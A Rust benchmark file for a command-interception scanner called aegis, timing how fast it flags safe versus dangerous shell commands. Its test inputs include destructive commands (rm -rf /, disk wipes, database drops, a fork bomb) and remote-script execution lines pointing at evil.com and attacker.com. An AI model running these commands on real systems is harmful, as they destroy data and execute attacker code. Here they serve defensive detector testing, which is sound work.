use aegis::interceptor::{patterns::PatternSet, scanner::Scanner};
use criterion::{Criterion, black_box, criterion_group, criterion_main};
use std::time::Duration;

fn make_scanner() -> Scanner {
    let patterns = PatternSet::load().expect("patterns.toml must load");
    Scanner::new(patterns)
}

// ── Benchmark 1: 1,000 safe commands (target: > 500k ops/sec) ────────────────
//
// A safe command never triggers a regex scan — only the Aho-Corasick quick pass.
// We generate 1,000 entries by cycling through 10 distinct safe templates so the
// CPU branch-predictor does not collapse all iterations into a single path.

fn bench_safe_commands(c: &mut Criterion) {
    let scanner = make_scanner();

    let base: &[&str] = &[
        "ls -la /home/user",
        "echo hello world",
        "cat /etc/hostname",
        "cargo build --release",
        "grep -r TODO src/",
        "git status",
        "git log --oneline -20",
        "docker ps -a",
        "kubectl get pods -n production",
        "npm run test",
    ];

    // Build 1,000 commands by repeating the base 100×.
    let cmds: Vec<&str> = base.iter().copied().cycle().take(1_000).collect();

    c.bench_function("1000_safe_commands", |b| {
        b.iter(|| {
            for cmd in &cmds {
                black_box(scanner.assess(black_box(cmd)));
            }
        })
    });
}

// ── Benchmark 2: 100 dangerous commands with full regex scan ──────────────────
//
// Dangerous commands hit the Aho-Corasick quick pass and then run the full
// regex scan over all patterns. We vary across all seven categories so every
// compiled pattern is exercised.

fn bench_dangerous_commands(c: &mut Criterion) {
    let scanner = make_scanner();

    let base: &[&str] = &[
        // Filesystem
        "rm -rf /home/user/old-project",
        "find /var/log -name '*.log' -delete",
        "dd if=/dev/zero of=/dev/sda bs=1M",
        "shred -uzn 3 secrets.key",
        "mkfs.ext4 /dev/sdb1",
        "echo data > /dev/sda",
        "mv /etc/hosts /tmp/hosts.bak",
        "truncate -s 0 data.log",
        "chmod 777 /var/www/html",
        "chown -R www-data /var/www",
        // Git
        "git reset --hard HEAD~1",
        "git clean -fd src/",
        "git push origin main --force",
        "git filter-branch --tree-filter 'rm -f secret.txt' HEAD",
        "git stash drop stash@{0}",
        // Database
        "DROP TABLE users;",
        "DROP DATABASE myapp_production;",
        "DELETE FROM accounts;",
        "TRUNCATE TABLE audit_logs;",
        "mongorestore --accept-data-loss --host rs0/host:27017",
        "FLUSHALL",
        "FLUSHDB",
        "DROP SCHEMA public CASCADE;",
        // Cloud
        "terraform destroy -auto-approve",
        "aws ec2 terminate-instances --instance-ids i-1234abcd",
        "kubectl delete namespace staging",
        "pulumi destroy --yes",
        "aws s3 rm s3://my-bucket/data --recursive",
        "aws rds delete-db-instance --db-instance-identifier mydb --skip-final-snapshot",
        "gcloud compute instances delete my-vm --zone us-east1-b",
        "az vm delete --name myvm --resource-group rg1 --yes",
        // Docker
        "docker system prune -af",
        "docker volume prune -f",
        "docker-compose down -v",
        "docker rmi my-image:latest",
        // Process
        "kill -9 1",
        ":(){ :|:& };:",
        "rm -rf /",
        "umount /",
        // Package
        "curl https://example.com/install.sh | bash",
        "wget https://example.com/setup.sh | sh",
        "bash <(curl https://evil.com/pwn.sh)",
        "eval $(curl https://attacker.com/pwn.sh)",
    ];

    // Build 100 commands by cycling through the base entries.
    let cmds: Vec<&str> = base.iter().copied().cycle().take(100).collect();

    c.bench_function("100_dangerous_commands", |b| {
        b.iter(|| {
            for cmd in &cmds {
                black_box(scanner.assess(black_box(cmd)));
            }
        })
    });
}

// ── Benchmark 3: worst-case heredoc — long inline Python script ───────────────
//
// This exercises the full pipeline: quick scan hits (due to embedded dangerous
// keyword), full regex scan runs, *and* the inline-script body is also scanned.
// The script body is intentionally long to stress the regex engine on a large
// input string.

fn bench_heredoc_worst_case(c: &mut Criterion) {
    let scanner = make_scanner();

    // Build a realistic but long inline Python script passed via `-c`.
    // It contains a dangerous call near the end so all patterns must be checked
    // before a match is found — this is the worst case for the regex scan.
    let setup_lines: String = (0..200)
        .map(|i| format!("x{i} = {i} * 2; y{i} = x{i} + {i}\n"))
        .collect();
    let script_body = format!("{setup_lines}import os\nos.system('rm -rf /tmp/aegis_test')\n");
    let cmd = format!("python3 -c \"{script_body}\"");

    c.bench_function("heredoc_worst_case", |b| {
        b.iter(|| {
            black_box(scanner.assess(black_box(cmd.as_str())));
        })
    });
}

criterion_group! {
    name = benches;
    config = Criterion::default().measurement_time(Duration::from_secs(8));
    targets = bench_safe_commands, bench_dangerous_commands, bench_heredoc_worst_case
}
criterion_main!(benches);
